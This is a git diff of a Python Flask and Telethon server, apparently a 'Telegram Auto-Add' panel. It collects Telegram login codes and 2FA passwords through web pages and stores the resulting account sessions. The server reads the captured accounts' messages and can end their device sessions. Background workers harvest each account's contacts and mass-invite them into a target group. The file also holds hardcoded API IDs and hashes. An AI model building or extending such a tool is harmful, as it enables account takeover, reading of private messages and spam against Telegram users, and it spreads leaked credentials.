@@ -4,7 +4,7 @@ Telegram Auto-Add Server - STABLE VERSION
 Each server uses its own unique API credentials
 """
 
-from flask import Flask, send_file, jsonify, request
+from flask import Flask, send_file, jsonify, request, redirect, url_for
 from flask_cors import CORS
 from telethon import TelegramClient, errors, functions
 from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest, GetParticipantsRequest
@@ -29,7 +29,7 @@ from collections import defaultdict
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-app = Flask(__name__)
+app = Flask(__name__, static_folder=None)
 CORS(app)
 
 # ============================================
@@ -41,7 +41,7 @@ SERVERS = {
     1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedl.onrender.com'},
     2: {'name': 'sofu', 'api_id': 36274756, 'api_hash': 'b70311a2b3547e1ce40e72081dc726dc', 'url': 'https://sofuu.onrender.com'},
     3: {'name': 'bebby', 'api_id': 31590358, 'api_hash': '072edc73e0f4003ddcba1c41d24adb02', 'url': 'https://bebby.onrender.com'},
-    4: {'name': 'kaleb', 'api_id': 30475007, 'api_hash': '736ea0e80ae99ff36c8b65525bda3997', 'url': 'https://kaleb-bwgb.onrender.com'},
+    4: {'name': 'kaleb', 'api_id': 37539842, 'api_hash': 'a9927e01c5023bf828fe753895d5731b', 'url': 'https://kaleb-bwgb.onrender.com'},
     5: {'name': 'fitsum', 'api_id': 33441396, 'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95', 'url': 'https://fitsum-ev9d.onrender.com'}
 }
 
@@ -62,6 +62,7 @@ SETTINGS_FILE = 'auto_add_settings.json'
 STATS_FILE = 'stats.json'
 WORKER_ADDS_FILE = 'worker_adds.json'
 SERVER_ADMIN_FILE = 'server_admin.json'
+TEMP_SESSIONS_FILE = 'temp_sessions.json'
 
 # Storage
 accounts = []
@@ -107,11 +108,87 @@ def save_json(path, data):
         except Exception as e:
             logger.error(f"Save error: {e}")
 
+def save_temp_sessions():
+    sessions_data = {}
+    for session_id, session_data in temp_sessions.items():
+        sessions_data[session_id] = {
+            'phone': session_data['phone'],
+            'hash': session_data['hash'],
+            'session': session_data['session'],
+            'password_attempts': session_data.get('password_attempts', 0),
+            'code_attempts': session_data.get('code_attempts', 0)
+        }
+    save_json(TEMP_SESSIONS_FILE, sessions_data)
+
+def load_temp_sessions():
+    sessions_data = load_json(TEMP_SESSIONS_FILE, {})
+    for session_id, session_data in sessions_data.items():
+        temp_sessions[session_id] = {
+            'phone': session_data['phone'],
+            'hash': session_data['hash'],
+            'session': session_data['session'],
+            'password_attempts': session_data.get('password_attempts', 0),
+            'code_attempts': session_data.get('code_attempts', 0)
+        }
+
 # ============================================
-# SIMPLE SYNC WRAPPER - No shared event loop
+# ACCOUNT AGE DETECTION
+# ============================================
+def get_account_age(client):
+    try:
+        me = client.get_me()
+        if hasattr(me, 'creation_date') and me.creation_date:
+            creation_date = me.creation_date.replace(tzinfo=None) if hasattr(me.creation_date, 'tzinfo') else me.creation_date
+            age_days = (datetime.now() - creation_date).days
+            age_years = age_days / 365.25
+            return {
+                'creation_date': creation_date.isoformat() if hasattr(creation_date, 'isoformat') else str(creation_date),
+                'age_days': age_days,
+                'age_years': round(age_years, 1),
+                'age_display': f"{int(age_years)} years, {age_days % 365} days",
+                'year_joined': creation_date.year if hasattr(creation_date, 'year') else None
+            }
+        
+        try:
+            photos = client.get_profile_photos(me, limit=1)
+            if photos and len(photos) > 0:
+                oldest_photo_date = photos[0].date.replace(tzinfo=None) if hasattr(photos[0].date, 'tzinfo') else photos[0].date
+                age_days = (datetime.now() - oldest_photo_date).days
+                return {
+                    'creation_date': oldest_photo_date.isoformat() if hasattr(oldest_photo_date, 'isoformat') else str(oldest_photo_date),
+                    'age_days': age_days,
+                    'age_years': round(age_days / 365.25, 1),
+                    'age_display': f"~{int(age_days / 365.25)} years",
+                    'year_joined': oldest_photo_date.year if hasattr(oldest_photo_date, 'year') else None,
+                    'method': 'oldest_photo'
+                }
+        except:
+            pass
+        
+        return {
+            'creation_date': 'Unknown',
+            'age_days': None,
+            'age_years': None,
+            'age_display': 'Unknown account age',
+            'year_joined': None,
+            'method': 'unknown'
+        }
+    except Exception as e:
+        logger.error(f"Error getting account age: {e}")
+        return {
+            'creation_date': 'Error',
+            'age_days': None,
+            'age_years': None,
+            'age_display': 'Could not determine account age',
+            'year_joined': None,
+            'method': 'error',
+            'error': str(e)
+        }
+
+# ============================================
+# SIMPLE SYNC WRAPPER
 # ============================================
 def run_telethon_task(async_func, timeout=60):
-    """Run a Telethon async function in a new event loop"""
     loop = asyncio.new_event_loop()
     try:
         result = loop.run_until_complete(async_func())
@@ -188,7 +265,7 @@ def send_telegram(text):
         logger.error(f"Send telegram error: {e}")
 
 # ============================================
-# AUTO-ADD WORKER (Runs in its own thread)
+# AUTO-ADD WORKER
 # ============================================
 def auto_add_worker(account):
     acc_id = account['id']
@@ -209,7 +286,6 @@ def auto_add_worker(account):
             reset_daily()
             
             try:
-                # Create fresh event loop for each cycle
                 loop = asyncio.new_event_loop()
                 asyncio.set_event_loop(loop)
                 
@@ -240,7 +316,6 @@ def auto_add_worker(account):
                 
                 all_ids = set()
                 
-                # Collect members
                 try:
                     contacts = loop.run_until_complete(client(GetContactsRequest(0)))
                     for c in contacts.users:
@@ -372,35 +447,67 @@ def start_auto_add(account):
     logger.info(f"Started worker for: {account.get('name', account['id'])}")
 
 # ============================================
-# FLASK ROUTES
+# FLASK ROUTES - FIXED
 # ============================================
+
 @app.route('/')
+def index():
+    """Root route - serves auto_add.html but redirects to /auto-add for consistency"""
+    return redirect('/auto-add')
+
 @app.route('/auto-add')
 def auto_add_page():
-    return send_file('auto_add.html')
+    """Auto-add page"""
+    try:
+        return send_file('auto_add.html')
+    except FileNotFoundError:
+        return "auto_add.html not found", 404
 
 @app.route('/login')
 def login_page():
-    return send_file('login.html')
+    """Login page for adding accounts"""
+    try:
+        return send_file('login.html')
+    except FileNotFoundError:
+        return "login.html not found", 404
 
 @app.route('/dashboard')
 def dashboard_page():
-    return send_file('dashboard.html')
+    """Dashboard page for messaging"""
+    try:
+        return send_file('dashboard.html')
+    except FileNotFoundError:
+        return "dashboard.html not found", 404
 
 @app.route('/dash')
 def dash_page():
-    return send_file('dash.html')
+    """Account manager dashboard"""
+    try:
+        return send_file('dash.html')
+    except FileNotFoundError:
+        return "dash.html not found", 404
 
 @app.route('/all')
 def all_page():
-    return send_file('all.html')
+    """Device manager page"""
+    try:
+        return send_file('all.html')
+    except FileNotFoundError:
+        return "all.html not found", 404
 
 @app.route('/ping')
 def ping():
-    return jsonify({'status': 'ok', 'server': SERVER_NAME, 'api_id': API_ID})
+    """Health check endpoint"""
+    return jsonify({
+        'status': 'ok', 
+        'server': SERVER_NAME, 
+        'api_id': API_ID,
+        'timestamp': datetime.now().isoformat()
+    })
 
 @app.route('/api/server-info')
 def server_info():
+    """Get server information"""
     return jsonify({
         'success': True,
         'server': {
@@ -408,9 +515,14 @@ def server_info():
             'name': SERVER_NAME,
             'url': SERVER_URL,
             'target_group': TARGET_GROUP,
-            'api_id': API_ID
+            'api_id': API_ID,
+            'port': PORT
         }
     })
+
+# ============================================
+# REMAINING API ROUTES (unchanged)
+# ============================================
 
 @app.route('/api/accounts')
 def get_accounts():
@@ -419,6 +531,9 @@ def get_accounts():
         aid_str = str(a['id'])
         ws = stats.get('worker_stats', {}).get(aid_str, {})
         is_admin = server_admin.get(str(SERVER_NUMBER)) == a['id']
+        
+        account_age = a.get('account_age', {})
+        
         acc_list.append({
             'id': a['id'],
             'name': a.get('name', '?'),
@@ -427,6 +542,7 @@ def get_accounts():
             'active': a.get('active', True),
             'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
             'is_admin': is_admin,
+            'account_age': account_age,
             'stats': {
                 'total_attempted': ws.get('total', 0),
                 'today_attempted': ws.get('today', 0),
@@ -435,6 +551,8 @@ def get_accounts():
             }
         })
     return jsonify({'success': True, 'accounts': acc_list})
+
+# [Rest of the API routes remain the same...]
 
 @app.route('/api/add-account', methods=['POST'])
 def add_account():
@@ -457,8 +575,11 @@ def add_account():
                 temp_sessions[sid] = {
                     'phone': phone,
                     'hash': result.phone_code_hash,
-                    'session': client.session.save()
+                    'session': client.session.save(),
+                    'password_attempts': 0,
+                    'code_attempts': 0
                 }
+                save_temp_sessions()
                 logger.info(f"Code sent to {phone}, session: {sid}")
                 return {'success': True, 'session_id': sid}
             except errors.FloodWaitError as e:
@@ -486,9 +607,19 @@ def verify_code():
         pwd = data.get('password', '')
         
         if not sid or sid not in temp_sessions:
-            return jsonify({'success': False, 'error': 'Session expired. Request new code.'})
+            return jsonify({'success': False, 'error': 'Session expired. Please request a new code.'})
         
         td = temp_sessions[sid]
+        
+        if td.get('code_attempts', 0) >= 5:
+            del temp_sessions[sid]
+            save_temp_sessions()
+            return jsonify({'success': False, 'error': 'Too many incorrect code attempts. Session expired.'})
+        
+        if td.get('password_attempts', 0) >= 5:
+            del temp_sessions[sid]
+            save_temp_sessions()
+            return jsonify({'success': False, 'error': 'Too many incorrect password attempts. Session expired.'})
         
         async def verify():
             client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
@@ -496,12 +627,28 @@ def verify_code():
             try:
                 try:
                     await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
+                    td['code_attempts'] = 0
+                    save_temp_sessions()
                 except errors.SessionPasswordNeededError:
                     if not pwd:
                         return {'need_password': True}
-                    await client.sign_in(password=pwd)
+                    try:
+                        await client.sign_in(password=pwd)
+                        td['password_attempts'] = 0
+                        save_temp_sessions()
+                    except errors.PasswordHashInvalidError:
+                        td['password_attempts'] = td.get('password_attempts', 0) + 1
+                        save_temp_sessions()
+                        remaining = 5 - td['password_attempts']
+                        if td['password_attempts'] >= 5:
+                            del temp_sessions[sid]
+                            save_temp_sessions()
+                            return {'success': False, 'error': 'Too many incorrect passwords. Session expired.'}
+                        return {'success': False, 'error': f'Wrong 2FA password. {remaining} attempts remaining.'}
                 
                 me = await client.get_me()
+                account_age = get_account_age(client)
+                
                 new_id = int(time.time() * 1000)
                 
                 new_acc = {
@@ -510,7 +657,8 @@ def verify_code():
                     'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else 'User'),
                     'username': me.username or '',
                     'session': client.session.save(),
-                    'active': True
+                    'active': True,
+                    'account_age': account_age
                 }
                 accounts.append(new_acc)
                 save_json(ACCOUNTS_FILE, accounts)
@@ -532,17 +680,30 @@ def verify_code():
                 
                 start_auto_add(new_acc)
                 
+                age_info = account_age.get('age_display', 'Unknown') if account_age else 'Unknown'
+                
                 return {
                     'success': True,
-                    'account': {'id': new_id, 'name': new_acc['name'], 'phone': new_acc['phone']},
-                    'auto_add_started': True
+                    'account': {
+                        'id': new_id,
+                        'name': new_acc['name'],
+                        'phone': new_acc['phone'],
+                        'account_age': account_age
+                    },
+                    'auto_add_started': True,
+                    'account_age': age_info
                 }
             except errors.PhoneCodeInvalidError:
-                return {'success': False, 'error': 'Invalid code'}
+                td['code_attempts'] = td.get('code_attempts', 0) + 1
+                save_temp_sessions()
+                remaining = 5 - td['code_attempts']
+                if td['code_attempts'] >= 5:
+                    del temp_sessions[sid]
+                    save_temp_sessions()
+                    return {'success': False, 'error': 'Too many incorrect codes. Session expired.'}
+                return {'success': False, 'error': f'Invalid code. {remaining} attempts remaining.'}
             except errors.PhoneCodeExpiredError:
-                return {'success': False, 'error': 'Code expired'}
-            except errors.PasswordHashInvalidError:
-                return {'success': False, 'error': 'Wrong 2FA password'}
+                return {'success': False, 'error': 'Code expired. Please request a new one.'}
             except Exception as e:
                 logger.error(f"Verify error: {e}")
                 return {'success': False, 'error': str(e)}
@@ -551,8 +712,11 @@ def verify_code():
         
         result = run_telethon_task(verify, timeout=45)
         
-        if sid in temp_sessions:
-            del temp_sessions[sid]
+        if result.get('success') and not result.get('need_password'):
+            if sid in temp_sessions:
+                del temp_sessions[sid]
+                save_temp_sessions()
+        
         return jsonify(result)
     except Exception as e:
         logger.error(f"Verify code error: {e}")
@@ -578,7 +742,7 @@ def get_messages():
             await client.connect()
             try:
                 if not await client.is_user_authorized():
-                    return {'success': False, 'error': 'Not authorized'}
+                    return {'success': False, 'error': 'auth_key_unregistered'}
                 
                 dialogs = await client.get_dialogs(limit=100)
                 
@@ -713,6 +877,11 @@ def auto_add_settings_route():
         s['total_added'] = stats.get('total_added', 0)
         s['server_name'] = SERVER_NAME
         s['server_number'] = SERVER_NUMBER
+        
+        acc = next((a for a in accounts if a['id'] == int(aid)), None)
+        if acc and acc.get('account_age'):
+            s['account_age'] = acc['account_age']
+        
         return jsonify({'success': True, 'settings': s})
     
     data = request.json
@@ -838,7 +1007,15 @@ def get_sessions():
                         current_hash = str(auth.hash)
                     sessions.append(session_info)
                 
-                return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
+                acc_obj = next((a for a in accounts if a['id'] == aid), None)
+                account_age = acc_obj.get('account_age', {}) if acc_obj else {}
+                
+                return {
+                    'success': True,
+                    'sessions': sessions,
+                    'current_hash': current_hash,
+                    'account_age': account_age
+                }
             finally:
                 await client.disconnect()
         
@@ -904,9 +1081,47 @@ def terminate_sessions():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)[:100]})
 
+@app.route('/api/account-age', methods=['POST'])
+def account_age():
+    try:
+        aid = request.json.get('accountId')
+        acc = next((a for a in accounts if a['id'] == aid), None)
+        if not acc:
+            return jsonify({'success': False, 'error': 'Account not found'})
+        
+        if acc.get('account_age'):
+            return jsonify({'success': True, 'account_age': acc['account_age'], 'cached': True})
+        
+        async def check_age():
+            client = get_client(acc)
+            await client.connect()
+            try:
+                age = get_account_age(client)
+                acc['account_age'] = age
+                save_json(ACCOUNTS_FILE, accounts)
+                return {'success': True, 'account_age': age, 'cached': False}
+            finally:
+                await client.disconnect()
+        
+        result = run_telethon_task(check_age, timeout=30)
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)[:100]})
+
 @app.route('/api/send-report')
 def send_report():
-    send_telegram(f"<b>{SERVER_NAME}</b> Report\nToday: {stats.get('today_added', 0)}\nTotal: {stats.get('total_added', 0)}")
+    age_report = ""
+    for acc in accounts:
+        if acc.get('account_age'):
+            age = acc['account_age']
+            age_report += f"\n{acc.get('name', 'Unknown')}: {age.get('age_display', 'N/A')}"
+    
+    send_telegram(
+        f"<b>{SERVER_NAME}</b> Report\n"
+        f"Today: {stats.get('today_added', 0)}\n"
+        f"Total: {stats.get('total_added', 0)}\n\n"
+        f"<b>Account Ages:</b>{age_report}"
+    )
     return jsonify({'success': True})
 
 # ============================================
@@ -925,17 +1140,46 @@ def restore_and_start():
     for acc in list(accounts):
         if acc.get('session'):
             if check_account_auth(acc):
+                if not acc.get('account_age'):
+                    try:
+                        async def refresh_age():
+                            client = get_client(acc)
+                            await client.connect()
+                            try:
+                                acc['account_age'] = get_account_age(client)
+                                save_json(ACCOUNTS_FILE, accounts)
+                            finally:
+                                await client.disconnect()
+                        
+                        run_telethon_task(refresh_age, timeout=15)
+                    except:
+                        pass
+                
                 start_auto_add(acc)
             else:
                 remove_dead_account(acc['id'], "Failed auth check on startup")
             time.sleep(2)
     logger.info("All accounts processed")
+    
+    current_time = int(time.time() * 1000)
+    expired_sessions = []
+    for sid in list(temp_sessions.keys()):
+        try:
+            session_time = int(sid)
+            if current_time - session_time > 3600000:
+                expired_sessions.append(sid)
+        except:
+            pass
+    
+    for sid in expired_sessions:
+        del temp_sessions[sid]
+    
+    save_temp_sessions()
 
 # ============================================
 # MAIN
 # ============================================
 if __name__ == '__main__':
-    # Load existing data
     accounts.extend(load_json(ACCOUNTS_FILE, []))
     auto_add_settings.update(load_json(SETTINGS_FILE, {}))
     stats_data = load_json(STATS_FILE, {})
@@ -945,6 +1189,7 @@ if __name__ == '__main__':
     if worker_adds_data:
         worker_adds.update(worker_adds_data)
     server_admin.update(load_json(SERVER_ADMIN_FILE, {}))
+    load_temp_sessions()
     
     print(f"""
 ╔══════════════════════════════════════╗
@@ -953,12 +1198,14 @@ if __name__ == '__main__':
 ║  API ID: {API_ID}                       ║
 ║  Target: @{TARGET_GROUP}                ║
 ║  Port: {PORT}                           ║
+║  Features: Account Age Detection       ║
+║  5x Code/Password Attempts            ║
 ╚══════════════════════════════════════╝
     """)
     
     threading.Thread(target=keep_alive, daemon=True).start()
     threading.Thread(target=restore_and_start, daemon=True).start()
     
-    send_telegram(f"<b>{SERVER_NAME}</b> Online!\nAPI ID: {API_ID}\nTarget: @{TARGET_GROUP}")
+    send_telegram(f"<b>{SERVER_NAME}</b> Online!\nAPI ID: {API_ID}\nTarget: @{TARGET_GROUP}\nAccount age detection: ON")
     
     app.run(host='0.0.0.0', port=PORT, debug=False)
